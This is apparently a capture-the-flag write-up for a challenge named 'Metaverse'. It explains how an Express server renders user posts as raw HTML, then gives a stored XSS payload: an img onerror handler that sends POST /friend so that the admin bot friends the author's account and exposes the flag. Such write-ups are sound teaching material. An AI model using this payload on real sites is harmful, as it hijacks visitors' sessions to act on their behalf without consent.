# Metaverse

Just metahack it bro

![metasubmit](https://imgur.com/VCuMKv1.png)

## MetaReconnaisance

The metasite is a single file expressjs metaserver `index.js`. There is a very suspicious metacomment for the `/post` metaendpoint shown below

```js
// templating engines are for losers!
const postTemplate = fs.readFileSync(path.join(__dirname, "post.html"), "utf8");
app.get("/post/:id", (req, res) => {
    if (posts.has(req.params.id)) {
        res.type("text/html").send(postTemplate.replace("$CONTENT", () => posts.get(req.params.id)));
    } else {
        res.status(400).type("text/html").send(postTemplate.replace("$CONTENT", "post not found :("));
    }
});
```

This is clearly very metainsecure because the metacontent of the metapost is sent as raw metahtml to the metavisitor.

The metaflag is set to the meta-admin's display name. In order to metasee the metaname, the meta-admin must metafriend us and we will be able to see the metaname in our metahome page.


## MetaExploitation

To metaexploit this metavulnerability, we make a metapost with following content

```html
<img src="/dskl" onerror="fetch('/friend', { method: 'POST', body: 'username=uwuowo', headers: { 'Content-Type': 'application/x-www-form-urlencoded', }, })" />
```

This will run the `POST /friend` to metafriend my metauser `uwuwowo` from the visitor's meta-account. I then sent the metalink to my metapost to the meta-adminbot to visit. After they visited my metapost, I became their meta-friend and captured the flag.

![metaflag](https://i.imgur.com/T2715kw.png)